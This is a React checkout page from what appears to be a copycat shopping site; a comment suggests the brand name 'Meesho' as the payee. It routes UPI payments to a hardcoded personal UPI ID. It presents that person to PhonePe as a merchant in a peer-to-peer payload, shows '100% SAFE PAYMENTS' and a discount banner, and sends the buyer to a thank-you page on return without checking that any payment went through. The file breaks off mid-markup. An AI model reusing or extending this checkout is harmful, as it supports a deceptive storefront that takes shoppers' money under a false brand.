import React, { useEffect, useState } from "react";

import { useDispatch, useSelector } from "react-redux";

import { useNavigate } from "react-router-dom";

import { BaynowandaddtocartAction } from "../redux/actions/Baynowdata";

import { BaynowandRemoveAction } from "../redux/actions/Baynowdata";

import {

  addtocartqtyActionMinus,

  addtocartqtyActionPlus,

  addtocartremoveAction,

} from "../redux/actions/AddTocart.action";

import LazyImage from "./LazyImage";

import gpayIcon from "../images/gpay.png";

function CheckOutpage({ data }) {

  const { buydata } = useSelector((state) => state?.buydata);

  console.log("buydata",buydata)

  const { addressdata } = useSelector((state) => state?.addressdata);

  const { cart } = useSelector((state) => state?.cart);

  const [apiData, setapiData] = useState(data);

  const allcartItem = apiData

    ?.filter((datafg) =>

      cart?.map((datamap) => datamap?.id)?.includes(datafg?.id)

    )

    ?.map((datamap) => {

      return {

        ...datamap,

        price: cart?.filter((datamapc) => datamapc?.id === datamap?.id)[0]?.free

          ? "0"

          : cart?.filter((datamapc) => datamapc?.id === datamap?.id)[0]

            ?.yesnoval

            ? (+datamap?.price + 20)?.toString()

            : datamap?.price,

      };

    });

  const dispatch = useDispatch();

  const navigate = useNavigate();

  const today = new Date();

  const [qtyAdd, setQtyAdd] = useState(1);

  const [showPaymentMethods, setShowPaymentMethods] = useState(true);

  const [selectedPayment, setSelectedPayment] = useState("phonepe");
  const [isUpiDropdownOpen, setIsUpiDropdownOpen] = useState(true);
  const [isQrDropdownOpen, setIsQrDropdownOpen] = useState(true);

  const [paymentAttempted, setPaymentAttempted] = useState(

    () => localStorage.getItem("paymentAttempted") === "1"

  );

  const after7Days = new Date(today);

  after7Days.setDate(today.getDate() + 7);

  useEffect(() => {

    window?.scrollTo(0, 0);

  }, []);

  // ==========================================
  // CONFIGURATION
  // ==========================================
  const upiId = "rajpatel1861997@okaxis";
  const verifiedAccountName = "Raj Patel"; // Or "Meesho"
  const payeeName = verifiedAccountName;
  const [copied, setCopied] = useState(false);

  const handleCopyUpi = () => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(upiId);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  // ==========================================
  // OPEN UPI APP FUNCTION
  // ==========================================
  const openSelectedUPIApp = (app, amount) => {
    const numericAmount = Number(amount);

    if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
      alert("Invalid payment amount");
      return;
    }

    if (!upiId || !upiId.includes("@")) {
      alert("UPI ID not configured");
      return;
    }

    const formattedAmount = numericAmount.toFixed(2);
    const orderNote = `Order_${Date.now()}`;
    const amountInPaise = Math.round(numericAmount * 100);

    const isIOS =
      typeof navigator !== "undefined" &&
      /iPhone|iPad|iPod/i.test(navigator.userAgent);

    let paymentUrl = "";

    if (app === "phonepe") {
      if (isIOS) {
        paymentUrl =
          `phonepe:upi://pay?pa=${encodeURIComponent(upiId)}` +
          `&pn=${encodeURIComponent(verifiedAccountName)}` +
          `&am=${formattedAmount}` +
          `&cu=INR` +
          `&tn=${encodeURIComponent(orderNote)}`;
      } else {
        const payload = {
          p2pPaymentCheckoutParams: {
            checkoutType: "COLLECT",
            initialAmount: amountInPaise,
            note: {
              type: "text",
              message: orderNote,
            },
            supportedInstruments: -1,
          },
          contact: {
            type: "EXTERNAL_MERCHANT",
            name: verifiedAccountName,
            vpa: upiId,
          },
        };

        const encodedPayload = btoa(
          unescape(encodeURIComponent(JSON.stringify(payload)))
        );

        paymentUrl =
          `phonepe://native?data=${encodeURIComponent(encodedPayload)}` +
          `&id=p2ppayment`;
      }
    } else if (app === "paytm") {
      paymentUrl =
        `paytmmp://cash_wallet?pa=${encodeURIComponent(upiId)}` +
        `&pn=${encodeURIComponent(verifiedAccountName)}` +
        `&am=${formattedAmount}` +
        `&cu=INR` +
        `&tn=${encodeURIComponent(orderNote)}` +
        `&featuretype=money_transfer`;
    } else {
      // BHIM / WhatsApp / Default UPI
      paymentUrl =
        `upi://pay?pa=${encodeURIComponent(upiId)}` +
        `&pn=${encodeURIComponent(verifiedAccountName)}` +
        `&am=${formattedAmount}` +
        `&cu=INR` +
        `&tn=${encodeURIComponent(orderNote)}`;
    }

    localStorage.setItem("paymentAttempted", "1");
    localStorage.setItem("orderReference", `ORD${Date.now()}`);
    setPaymentAttempted(true);

    // Trigger app
    window.location.href = paymentUrl;
  };



  useEffect(() => {

    const handleReturnFromPaymentApp = () => {

      if (

        document.visibilityState === "visible" &&

        localStorage.getItem("paymentAttempted") === "1"

      ) {

        localStorage.removeItem("paymentAttempted");

        navigate("/thank-you");

        window?.scrollTo(0, 0);

      }

    };



    document.addEventListener("visibilitychange", handleReturnFromPaymentApp);

    window.addEventListener("focus", handleReturnFromPaymentApp);



    return () => {

      document.removeEventListener("visibilitychange", handleReturnFromPaymentApp);

      window.removeEventListener("focus", handleReturnFromPaymentApp);

    };

  }, [navigate]);





  const handleContinueData = () => {

    const buyNowPrice =

      buydata?.length > 0

        ? qtyAdd *

          (buydata[0]?.yesnoval

            ? +buydata[0]?.price + 20

            : +buydata[0]?.price)

        : 0;



    const exactOrderTotal = buyNowPrice + (finalPriceAll || 0);



    const checkoutItemsWithQty =

      allcartItem?.map((item) => ({

        ...item,

        qty: cart?.find((cartItem) => cartItem?.id === item?.id)?.qty || 1,

      })) || [];



    const payload =

      buydata?.length > 0

        ? {

            ...buydata[0],

            qty: qtyAdd,

            checkoutItems: checkoutItemsWithQty,

            orderTotal: exactOrderTotal,

          }

        : {

            price: 0,

            qty: 1,

            checkoutItems: checkoutItemsWithQty,

            orderTotal: exactOrderTotal,

          };



    localStorage.setItem("ordertotal", String(exactOrderTotal));

    dispatch(BaynowandaddtocartAction(payload));

    setShowPaymentMethods(true);

    setTimeout(() => {

      document.getElementById("checkout-payment-methods")?.scrollIntoView({

        behavior: "smooth",

        block: "start",

      });

    }, 50);

  };

  const finalPriceAll = allcartItem

    ?.map(

      (datafgfh) =>

        datafgfh?.price *

        cart?.filter((datacarts) => datacarts?.id === datafgfh?.id)[0]?.qty

    )

    ?.reduce((acc, val) => acc + val, 0);

useEffect(() => {

  if (!buydata?.[0]) return;



  const itemFound = cart?.some((c) => c.id === buydata[0].id);



  if (itemFound) {

    dispatch(BaynowandRemoveAction());

  }

}, [cart, buydata]);





  return (

    <>

      <div className="w-full h-full bg-gray-100 pb-[200px]">

        <div className="hidden">

          <div className="w-full">

            <div className="w-full bg-white px-[24px] gap-[16px] py-[16px] flex justify-start items-center border-b-[1px] border-[#cecede]">

              <button

                onClick={() => {

                  navigate("/addaddress");

                  window?.scrollTo(0, 0);

                }}

                type="button"

                className="m-0 p-0 w-fit bg-transparent"

              >

                <svg

                  width="20"

                  height="20"

                  viewBox="0 0 20 20"

                  fill="#353543"

                  xmlns="http://www.w3.org/2000/svg"

                >

                  <path

                    d="M13.7461 2.31408C13.5687 2.113 13.3277 2 13.0765 2C12.8252 2 12.5843 2.113 12.4068 2.31408L6.27783 9.24294C5.90739 9.66174 5.90739 10.3382 6.27783 10.757L12.4068 17.6859C12.7773 18.1047 13.3757 18.1047 13.7461 17.6859C14.1166 17.2671 14.0511 16.5166 13.7461 16.1718L8.29154 9.99462L13.7461 3.82817C13.9684 3.57691 14.1071 2.72213 13.7461 2.31408Z"

                    className="w-[20px] h-[20px]"

                  ></path>

                </svg>

              </button>

              <p className="text-[13px] w-fit text-center text-[rgb(53_53_67)] font-[500]">

                REVIEW

              </p>

            </div>

            <div className="w-full min-w-[300px] h-full bg-white p-[8px] flex justify-center items-center border-b-[1px] border-[#cecede]">

              <ul className="w-full flex items-center justify-center p-0 m-0 list-none">

                <div className="flex flex-col items-center w-1/2 gap-[6px] max-w-200">

                  <div className="w-full flex items-center justify-center p-0 m-0">

                    <div className="flex-grow h-[2px] bg-blue-500 invisible"></div>

                    <div className="flex justify-center items-center w-[20px] h-[20px] rounded-full border-2 border-blue-500 text-blue-500 text-sm">

                      1

                    </div>

                    <div className="flex-grow h-[2px] bg-gray-300"></div>

                  </div>

                  <div className="text-[11px] font-normal text-[#353543]">

                    Review

                  </div>

                </div>

                <div className="flex flex-col items-center w-1/2 gap-[6px] max-w-200">

                  <div className="w-full flex items-center justify-center p-0 m-0">

                    <div className="flex-grow h-[2px] bg-gray-300 visible"></div>

                    <div className="flex justify-center items-center w-[20px] h-[20px] rounded-full border-2 border-gray-300 text-gray-300 text-xs">

                      2

                    </div>

                    <div className="flex-grow h-[2px] bg-gray-300 invisible"></div>

                  </div>

                  <div className="text-[11px] font-normal text-gray-300">

                    Payment

                  </div>

                </div>

              </ul>

            </div>

          </div>

        </div>

        <div className="hidden">

        <div className="bg-[rgb(234_234_242)] pb-2 w-full pt-[114px]">

          <div className="w-full h-full bg-white py-[12px] gap-2 px-[16px] flex justify-start items-center border-b-[1px] border-[#cecede]">

            <svg

              width="16"

              className="w-[20px] h-[20px]"

              height="16"

              viewBox="0 0 16 16"

              fill="none"

              xmlns="http://www.w3.org/2000/svg"

            >

              <rect width="16" height="16" fill="white"></rect>

              <g clip-path="url(#clip0_849_44222)">

                <path

                  d="M16 8.85828V11.0437C16 11.6301 15.5203 12.1098 14.9339 12.1098H14.4187C14.2143 12.9005 13.4947 13.4868 12.6507 13.4868C11.8068 13.4868 11.0872 12.9005 10.8828 12.1098H5.10827C4.90394 12.9005 4.20211 13.4868 3.34037 13.4868C2.47862 13.4868 1.77679 12.9005 1.56358 12.1098H1.15491C0.524153 12.1098 0 11.5324 0 10.8216V9.15145H10.9361V5.0293H12.6507C13.0239 5.0293 13.3792 5.20698 13.6191 5.49126L15.6979 8.03207C15.8934 8.25417 15.9822 8.55623 15.9822 8.8494H15.9911L16 8.85828Z"

                  fill="#3A66CF"

                ></path>

                <path

                  d="M12.0022 3.11049V9.47141H0V3.11049C0 2.50639 0.470849 2 1.03942 2H10.9628C11.5403 2 12.0022 2.48862 12.0022 3.11049Z"

                  fill="#90B1FB"

                ></path>

              </g>

              <defs>

                <clipPath id="clip0_849_44222">

                  <rect

                    width="16"

                    height="11.4781"

                    fill="white"

                    transform="translate(0 2)"

                  ></rect>

                </clipPath>

              </defs>

            </svg>

            <p className="text-[13px] font-[600] text-[#353543]">

              Estimated Delivery by{" "}

              {after7Days.toLocaleDateString("en-GB", { weekday: "long" })},{" "}

              {after7Days?.getDate() < 10

                ? "0" + after7Days?.getDate()

                : after7Days?.getDate()}

              th {after7Days.toLocaleDateString("en-GB", { month: "short" })}

            </p>

          </div>

          <div className="w-full">

            {allcartItem?.map((dataitem) => {

              return (

                <div className="w-full h-full bg-white gap-3 p-[16px] flex justify-start items-start border-b-[1px] border-[#cecede]">

                  <div className="w-[60px] h-[60px]">

                    <LazyImage

                      src={Array.isArray(dataitem?.image) ? dataitem.image[0] : (dataitem?.image || dataitem?.images?.[0])}

                      className="aspect-square w-full h-full object-cover"

                    />

                  </div>

                  <div className="w-[calc(100%_-_84px)]">

                    {/* <svg

                      width="40"

                      height="20"

                      viewBox="0 0 40 20"

                      fill="none"

                      xmlns="http://www.w3.org/2000/svg"

                    >

                      <rect

                        x="1"

                        y="1"

                        width="38"

                        height="18"

                        rx="9"

                        fill="#2354E5"

                      ></rect>

                      <rect

                        x="1"

                        y="1"

                        width="38"

                        height="18"

                        rx="9"

                        stroke="white"

                        stroke-width="2"

                      ></rect>

                      <path

                        d="M11.8616 8.30091L10.5316 6.97095C10.3958 6.83447 10.2078 6.75 10 6.75C9.58579 6.75 9.25 7.08579 9.25 7.5V13.5C9.25 13.9142 9.58579 14.25 10 14.25C10.4142 14.25 10.75 13.9142 10.75 13.5L10.751 9.69616C10.7742 9.04511 11.2333 8.46869 11.8616 8.30091Z"

                        fill="white"

                      ></path>

                      <path

                        d="M17.25 10.3713V13.5C17.25 13.9142 17.5858 14.25 18 14.25C18.4142 14.25 18.75 13.9142 18.75 13.5V8.87132L17.25 10.3713Z"

                        fill="white"

                      ></path>

                      <path

                        fill-rule="evenodd"

                        clip-rule="evenodd"

                        d="M18.5303 6.96967C18.8232 7.26256 18.8232 7.73744 18.5303 8.03033L14.5303 12.0303C14.2374 12.3232 13.7626 12.3232 13.4697 12.0303L11.7197 10.2803C11.4268 9.98744 11.4268 9.51256 11.7197 9.21967C12.0126 8.92678 12.4874 8.92678 12.7803 9.21967L14 10.4393L17.4697 6.96967C17.7626 6.67678 18.2374 6.67678 18.5303 6.96967Z"

                        fill="white"

                      ></path>

                      <path

                        fill-rule="evenodd"

                        clip-rule="evenodd"

                        d="M27.25 5.75C27.6642 5.75 28 6.08579 28 6.5V13.5C28 13.9142 27.6642 14.25 27.25 14.25C26.8358 14.25 26.5 13.9142 26.5 13.5V6.5C26.5 6.08579 26.8358 5.75 27.25 5.75Z"

                        fill="white"

                      ></path>

                      <path

                        fill-rule="evenodd"

                        clip-rule="evenodd"

                        d="M30 5.75C30.4142 5.75 30.75 6.08579 30.75 6.5V13.5C30.75 13.9142 30.4142 14.25 30 14.25C29.5858 14.25 29.25 13.9142 29.25 13.5V6.5C29.25 6.08579 29.5858 5.75 30 5.75Z"

                        fill="white"

                      ></path>

                      <path

                        fill-rule="evenodd"

                        clip-rule="evenodd"

                        d="M22.375 8.625C20.8398 8.625 19.75 10.0032 19.75 11.5C19.75 12.9968 20.8398 14.375 22.375 14.375C22.9095 14.375 23.4012 14.1353 23.7878 13.7357C23.8866 14.0344 24.1681 14.25 24.5 14.25C24.9142 14.25 25.25 13.9142 25.25 13.5V9.5C25.25 9.08579 24.9142 8.75 24.5 8.75C24.1681 8.75 23.8866 8.96556 23.7878 9.26432C23.4012 8.86467 22.9095 8.625 22.375 8.625ZM23.75 11.5005C23.75 10.7053 23.1904 10.0605 22.5 10.0605C22.0934 10.0605 21.7322 10.2841 21.5039 10.6304C21.1676 11.1219 21.1614 11.8402 21.4842 12.3399C21.7111 12.7036 22.0815 12.9405 22.5 12.9405C23.1904 12.9405 23.75 12.2958 23.75 11.5005Z"

                        fill="white"

                      ></path>

                    </svg> */}

                    <p className="text-[13px] font-[600] text-[#353543] mb-[8px]">

                      {dataitem?.title}

                    </p>

                    <div className="flex justify-start items-center gap-1 mb-[8px]">

                      <p className="text-[13px] font-[400] text-[#353543]">

                        {dataitem?.price === "0"

                          ? "Free"

                          : "₹" + dataitem?.price}

                      </p>

                      {/* <p className="text-[11px] line-through font-[400] text-[#8B8BA3]">

                        ₹{dataitem?.cancelprice}

                      </p>

                      <p className="text-[11px] font-[400] text-[#038D63]">

                        {dataitem?.cancelprice && dataitem?.price

                          ? Math.round(

                            ((+dataitem?.cancelprice - +dataitem?.price) /

                              +dataitem?.cancelprice) *

                            100

                          )

                          : 0}

                        % Off

                      </p> */}

                    </div>

                    <div className="flex justify-between items-center">

                      <div className="flex justify-start items-center gap-2">

                        <p className="text-[13px] font-[500] text-[#353543]">

                          Size :{" "}

                          {

                            cart?.filter(

                              (datacarts) => datacarts?.id === dataitem?.id

                            )[0]?.sizeselect

                          }

                        </p>

                        <span className="w-[4px] h-[4px] bg-[rgb(206_206_222)] rounded-full"></span>

                        <div className="flex justify-start items-center gap-1">

                          <p>Qty :</p>

                          <button

                            type="button"

                            disabled={

                              cart?.filter(

                                (datacarts) => datacarts?.id === dataitem?.id

                              )[0]?.qty === 1

                            }

                            onClick={() => {

                              dispatch(addtocartqtyActionMinus(dataitem?.id));

                            }}

                            className="m-0 p-0 w-[20px] h-[20px] bg-transparent border-[1px] border-[#353543] flex justify-center items-center"

                          >

                            -

                          </button>

                          {

                            cart?.filter(

                              (datacarts) => datacarts?.id === dataitem?.id

                            )[0]?.qty

                          }

                          <button

                            type="button"

                            disabled={

                              dataitem?.price === "0" ||

                              (cart?.find((item) => item?.id === dataitem?.id)?.qty || 1) >= 2

                            }

                            onClick={() => {

                              dispatch(addtocartqtyActionPlus(dataitem?.id));

                            }}

                            className="m-0 p-0 w-[20px] h-[20px] bg-transparent border-[1px] border-[#353543] flex justify-center items-center"

                          >

                            +

                          </button>{" "}

                        </div>

                      </div>

                      <button

                        type="button"

                        onClick={() => {

                          dispatch(addtocartremoveAction(dataitem?.id));

                        }}

                        className="bg-transparent m-0 p-0 border-none text-gray-600 font-bold"

                      >

                        X Remove

                      </button>

                    </div>

                  </div>

                </div>

              );

            })}

          </div>

          {buydata?.length > 0 && buydata[0]?.image && (

            <div className="w-full h-full bg-white py-[18px] gap-3 px-[16px] flex justify-start items-start border-b-[1px] border-[#cecede]">

              <div className="w-[60px] h-[60px]">

                <LazyImage

                  src={Array.isArray(buydata[0]?.image) ? buydata[0].image[0] : (buydata[0]?.image || buydata[0]?.images?.[0])}

                  className="aspect-square w-full h-full object-cover"

                />

              </div>

              <div className="w-[calc(100%_-_84px)]">

                {/* <svg

                  width="40"

                  height="20"

                  viewBox="0 0 40 20"

                  fill="none"

                  xmlns="http://www.w3.org/2000/svg"

                >

                  <rect

                    x="1"

                    y="1"

                    width="38"

                    height="18"

                    rx="9"

                    fill="#2354E5"

                  ></rect>

                  <rect

                    x="1"

                    y="1"

                    width="38"

                    height="18"

                    rx="9"

                    stroke="white"

                    stroke-width="2"

                  ></rect>

                  <path

                    d="M11.8616 8.30091L10.5316 6.97095C10.3958 6.83447 10.2078 6.75 10 6.75C9.58579 6.75 9.25 7.08579 9.25 7.5V13.5C9.25 13.9142 9.58579 14.25 10 14.25C10.4142 14.25 10.75 13.9142 10.75 13.5L10.751 9.69616C10.7742 9.04511 11.2333 8.46869 11.8616 8.30091Z"

                    fill="white"

                  ></path>

                  <path

                    d="M17.25 10.3713V13.5C17.25 13.9142 17.5858 14.25 18 14.25C18.4142 14.25 18.75 13.9142 18.75 13.5V8.87132L17.25 10.3713Z"

                    fill="white"

                  ></path>

                  <path

                    fill-rule="evenodd"

                    clip-rule="evenodd"

                    d="M18.5303 6.96967C18.8232 7.26256 18.8232 7.73744 18.5303 8.03033L14.5303 12.0303C14.2374 12.3232 13.7626 12.3232 13.4697 12.0303L11.7197 10.2803C11.4268 9.98744 11.4268 9.51256 11.7197 9.21967C12.0126 8.92678 12.4874 8.92678 12.7803 9.21967L14 10.4393L17.4697 6.96967C17.7626 6.67678 18.2374 6.67678 18.5303 6.96967Z"

                    fill="white"

                  ></path>

                  <path

                    fill-rule="evenodd"

                    clip-rule="evenodd"

                    d="M27.25 5.75C27.6642 5.75 28 6.08579 28 6.5V13.5C28 13.9142 27.6642 14.25 27.25 14.25C26.8358 14.25 26.5 13.9142 26.5 13.5V6.5C26.5 6.08579 26.8358 5.75 27.25 5.75Z"

                    fill="white"

                  ></path>

                  <path

                    fill-rule="evenodd"

                    clip-rule="evenodd"

                    d="M30 5.75C30.4142 5.75 30.75 6.08579 30.75 6.5V13.5C30.75 13.9142 30.4142 14.25 30 14.25C29.5858 14.25 29.25 13.9142 29.25 13.5V6.5C29.25 6.08579 29.5858 5.75 30 5.75Z"

                    fill="white"

                  ></path>

                  <path

                    fill-rule="evenodd"

                    clip-rule="evenodd"

                    d="M22.375 8.625C20.8398 8.625 19.75 10.0032 19.75 11.5C19.75 12.9968 20.8398 14.375 22.375 14.375C22.9095 14.375 23.4012 14.1353 23.7878 13.7357C23.8866 14.0344 24.1681 14.25 24.5 14.25C24.9142 14.25 25.25 13.9142 25.25 13.5V9.5C25.25 9.08579 24.9142 8.75 24.5 8.75C24.1681 8.75 23.8866 8.96556 23.7878 9.26432C23.4012 8.86467 22.9095 8.625 22.375 8.625ZM23.75 11.5005C23.75 10.7053 23.1904 10.0605 22.5 10.0605C22.0934 10.0605 21.7322 10.2841 21.5039 10.6304C21.1676 11.1219 21.1614 11.8402 21.4842 12.3399C21.7111 12.7036 22.0815 12.9405 22.5 12.9405C23.1904 12.9405 23.75 12.2958 23.75 11.5005Z"

                    fill="white"

                  ></path>

                </svg> */}

                <p className="text-[13px] font-[600] text-[#353543] mb-[8px]">

                  {buydata[0]?.title}

                </p>

                <div className="flex justify-start items-center gap-1 mb-[8px]">

                  <p className="text-[13px] font-[500] text-[#353543]">

                    ₹

                    {buydata[0]?.yesnoval

                      ? (+buydata[0]?.price + 20)?.toString()

                      : buydata[0]?.price}

                  </p>

                  {/* <p className="text-[11px] line-through font-[400] text-[#8B8BA3]">

                    ₹{buydata[0]?.cancelprice}

                  </p> */}

                  {/* <p className="text-[11px] font-[400] text-[#038D63]">

                    {buydata[0]?.cancelprice && buydata[0]?.price

                      ? Math.round(

                        ((+buydata[0]?.cancelprice -

                          (buydata[0]?.yesnoval

                            ? +buydata[0]?.price + 20

                            : +buydata[0]?.price)) /

                          +buydata[0]?.cancelprice) *

                        100

                      )

                      : 0}

                    % Off

                  </p> */}

                </div>

                <div className="flex justify-between items-center">

                  <div className="flex justify-start items-center gap-2">

                    <p className="text-[13px] font-[500] text-[#353543]">

                      Size :{buydata[0]?.size}

                    </p>

                    <span className="w-[4px] h-[4px] bg-[rgb(206_206_222)] rounded-full"></span>

                    <div className="flex justify-start items-center gap-1">

                      <p>Qty :</p>

                      <button

                        type="button"

                        onClick={() => {

                          if (qtyAdd > 1) {

                            setQtyAdd(qtyAdd - 1);

                          }

                        }}

                        className="m-0 p-0 w-[20px] h-[20px] bg-transparent border-[1px] border-[#353543] flex justify-center items-center"

                      >

                        -

                      </button>

                      {qtyAdd}

                      <button

                        type="button"

                        disabled={qtyAdd >= 2}

                        onClick={() => {

                          if (qtyAdd < 2) {

                            setQtyAdd(qtyAdd + 1);

                          }

                        }}

                        className="m-0 p-0 w-[20px] h-[20px] bg-transparent border-[1px] border-[#353543] flex justify-center items-center"

                      >

                        +

                      </button>{" "}

                    </div>

                  </div>

                  <button

                    type="button"

                    onClick={() => {

                      dispatch(BaynowandRemoveAction());

                    }}

                    className="bg-transparent m-0 p-0 border-none text-gray-600 font-bold"

                  >

                    X Remove

                  </button>

                </div>

              </div>

            </div>

          )}

          <div className="w-full h-full bg-white py-[12px] px-[16px] flex justify-between items-center">

            <p className="text-[13px] font-[500] text-[#353543] uppercase">

              <span className="capitalize">Sold by</span> : Dream Fashion

              <span className="uppercase">

                {" "}

                {buydata?.length > 0 && addressdata[0]?.name}

              </span>

            </p>

            <p className="text-[13px] font-[400] text-[#616173] capitalize">

              Free Delivery

            </p>

          </div>

        </div>

        <div className="bg-[rgb(234_234_242)] pb-2 w-full">

          <div className="w-full h-full bg-white p-[16px]">

            <div className="flex justify-between items-center">

              <div className="flex justify-start gap-[6px] items-center">

                <svg

                  width="20"

                  height="20"

                  viewBox="0 0 20 20"

                  fill="none"

                  className="w-[20px] h-[20px]"

                  xmlns="http://www.w3.org/2000/svg"

                >

                  <rect width="20" height="20" fill="white"></rect>

                  <path

                    d="M15.2565 17.8276C15.2565 19.0296 12.9683 19.9999 10.1588 19.9999C7.34922 19.9999 5.06104 19.0296 5.06104 17.8276C5.07552 17.6683 5.14793 17.4945 5.22034 17.3642C5.72722 16.3794 7.75472 15.6553 10.1877 15.6553C12.6207 15.6553 14.6483 16.3794 15.1406 17.3642C15.2131 17.4945 15.2565 17.6683 15.2565 17.8276Z"

                    fill="#3A66CF"

                  ></path>

                  <path

                    d="M17.0527 6.4301C16.5313 -0.0434386 10.1157 7.62167e-06 10.1157 7.62167e-06C10.1157 7.62167e-06 3.6711 -0.0434386 3.14974 6.4301C2.70079 12.1651 8.49367 16.9152 9.82603 17.929C9.89844 17.9869 9.99982 18.0159 10.1012 18.0159C10.2026 18.0159 10.2895 17.9869 10.3764 17.929C11.7087 16.9152 17.5161 12.1651 17.0527 6.4301ZM10.1157 9.71756C9.57984 9.71756 9.05848 9.55826 8.62401 9.26861C8.17506 8.97897 7.82749 8.55899 7.62474 8.06659C7.42199 7.5742 7.36406 7.03835 7.46544 6.517C7.56681 5.99564 7.82749 5.51772 8.20403 5.14119C8.58056 4.76465 9.05848 4.50397 9.57984 4.4026C10.1012 4.30122 10.637 4.34467 11.1294 4.54742C11.6218 4.75017 12.0418 5.09774 12.3459 5.53221C12.6356 5.98116 12.7949 6.50251 12.7949 7.02387C12.7949 7.7335 12.5197 8.41416 12.0128 8.92104C11.506 9.42792 10.8253 9.71756 10.1157 9.71756Z"

                    fill="#90B1FB"

                  ></path>

                </svg>

                <p className="text-[15px] capitalize w-fit text-[rgb(53_53_67)] font-[600]">

                  Delivery Address

                </p>

              </div>

              <button

                type="button"

                onClick={() => {

                  navigate("/addaddress");

                  window?.scrollTo(0, 0);

                }}

                className={`m-0 h-[30px] w-fit

                    border-black px-[6px] text-black bg-transparent text-[13px] font-[600] rounded-[4px] border-[2px] flex justify-center items-center`}

              >

                Change

              </button>

            </div>

            <div className="mt-2">

              <div className="flex justify-start items-center gap-2">

                <p className="text-[13px] font-[400] text-[#616173]">

                  {addressdata?.length > 0 && addressdata[0]?.name}

                </p>

                <span className="w-[4px] h-[4px] bg-[rgb(206_206_222)] rounded-full"></span>

                <p className="text-[13px] font-[400] text-[#616173]">

                  {addressdata?.length > 0 && addressdata[0]?.contact}

                </p>

              </div>

              <p className="text-[13px] font-[400] text-[#616173]">

                {addressdata?.length > 0 && addressdata[0]?.house}

                {addressdata?.length > 0 && addressdata[0]?.road},

                {addressdata?.length > 0 && addressdata[0]?.nearby},{" "}

                {addressdata?.length > 0 && addressdata[0]?.city},{" "}

                {addressdata?.length > 0 && addressdata[0]?.state} -{" "}

                {addressdata?.length > 0 && addressdata[0]?.pincode}

              </p>

            </div>

          </div>

        </div>

        <div className="bg-[rgb(234_234_242)] w-full">

          <div className="w-full h-full bg-white px-[20px] py-[16px]">

            <p className="text-[15px] font-[600] text-[#353543]">

              Price Details ( {cart.length + buydata?.length} items )

            </p>

            <div className="w-full border-b-[1px] border-[#cecede]">

              <div className="flex justify-between items-center my-[12px]">

                <p className="text-[13px] font-[400] text-[#353543]">

                  Total Product Price

                </p>

                <p className="text-[13px] font-[400] text-[#353543]">

                  + ₹

                  {buydata?.length > 0

                    ? qtyAdd * (buydata[0]?.yesnoval

                      ? +buydata[0]?.price + 20

                      : +buydata[0]?.price) +

                    allcartItem

                      ?.map(

                        (datafgfh) =>

                          datafgfh?.price *

                          cart?.filter(

                            (datacarts) => datacarts?.id === datafgfh?.id

                          )[0]?.qty

                      )

                      ?.reduce((acc, val) => acc + val, 0)

                    : allcartItem

                      ?.map(

                        (datafgfh) =>

                          datafgfh?.price *

                          cart?.filter(

                            (datacarts) => datacarts?.id === datafgfh?.id

                          )[0]?.qty

                      )

                      ?.reduce((acc, val) => acc + val, 0)}

                </p>

              </div>

            </div>

            <div className="flex justify-between items-center mt-[10px]">

              <p className="text-[15px] font-[600] text-[#353543] w-fit">

                Order Total

              </p>

              <p className="text-[15px] font-[600] text-[#353543]">

                ₹

                {buydata?.length > 0

                  ? qtyAdd *

                  (buydata[0]?.yesnoval

                    ? +buydata[0]?.price + 20

                    : +buydata[0]?.price) +

                  allcartItem

                    ?.map(

                      (datafgfh) =>

                        datafgfh?.price *

                        cart?.filter(

                          (datacarts) => datacarts?.id === datafgfh?.id

                        )[0]?.qty

                    )

                    ?.reduce((acc, val) => acc + val, 0)

                  : allcartItem

                    ?.map(

                      (datafgfh) =>

                        datafgfh?.price *

                        cart?.filter(

                          (datacarts) => datacarts?.id === datafgfh?.id

                        )[0]?.qty

                    )

                    ?.reduce((acc, val) => acc + val, 0)}

              </p>

            </div>

          </div>

        </div>

        </div>

        {showPaymentMethods && (

          <div

            id="checkout-payment-methods"

            className="bg-[#f5f5f7] min-h-screen w-full pb-[110px] pt-[28px]"

          >

            <div className="bg-white px-[16px] py-[18px] w-full max-w-[500px] mx-auto min-h-[650px]">

              <div className="flex items-center justify-between mb-[18px]">

                <p className="text-[18px] font-[700] text-[#222]">

                  Select Payment Method

                </p>

                <div className="text-[10px] leading-[11px] font-[600] text-[#3A66CF] text-right">

                  🛡️ 100% SAFE<br />PAYMENTS

                </div>

              </div>



              <div className="bg-[#eef2ff] rounded-[10px] px-[14px] py-[15px] flex items-center gap-3 mb-[16px]">

                <div className="w-[28px] h-[28px] rounded-full bg-[#079b73] text-white flex items-center justify-center font-bold">

                  %

                </div>

                <p className="text-[14px] font-[500] text-[#1746d1]">

                  Pay online & get EXTRA ₹33 off

                </p>

              </div>



              <p className="text-[11px] font-[600] text-[#616173] mb-[10px]">

                PAY ONLINE

              </p>


              <div className="border border-[#d9dce8] rounded-[10px] overflow-hidden mb-[16px]">

                <div
                  onClick={() => setIsUpiDropdownOpen((prev) => !prev)}
                  className="px-[14px] py-[14px] flex items-center justify-between cursor-pointer select-none bg-white hover:bg-gray-50/50 transition-colors"
                >

                  <div className="flex items-center gap-2">

                    <span className="bg-[#5575ef] text-white text-[10px] font-bold px-[5px] py-[2px] rounded">

                      UPI

                    </span>

                    <span className="text-[14px] font-[600] text-[#25252d]">

                      UPI(PhonePe/Paytm)

                    </span>

                  </div>

                  <span
                    className={`text-[#616173] text-[16px] font-semibold transition-transform duration-200 inline-block ${
                      isUpiDropdownOpen ? "rotate-180" : ""
                    }`}
                  >
                    ⌄
                  </span>

                </div>

                {isUpiDropdownOpen && (
                  <div className="border-t border-[#e7e7ef]">
                    {[

                      ["phonepe", "PhonePe", "P"],

                      ["paytm", "Paytm", "P"]

                    ].map(([value, label, icon]) => (

                      <label

                        key={value}

                        className="px-[14px] py-[15px] border-b last:border-b-0 border-[#ececf2] flex items-center justify-between cursor-pointer hover:bg-gray-50/40 transition-colors"

                      >

                        <div className="flex items-center gap-[12px]">

                          <input

                            type="radio"

                            name="checkout-payment"

                            value={value}

                            checked={selectedPayment === value}

                            onChange={() => setSelectedPayment(value)}

                            className="w-[18px] h-[18px] accent-[#3A66CF]"

                          />

                          <span className="text-[14px] font-[600] text-[#25252d]">

                            {label}

                          </span>

                        </div>

                        {value === "phonepe" ? (
                          <img
                            src="https://cdn.simpleicons.org/phonepe/5F259F"
                            alt="PhonePe"
                            className="w-[30px] h-[30px] object-contain"
                          />
                        ) : value === "paytm" ? (
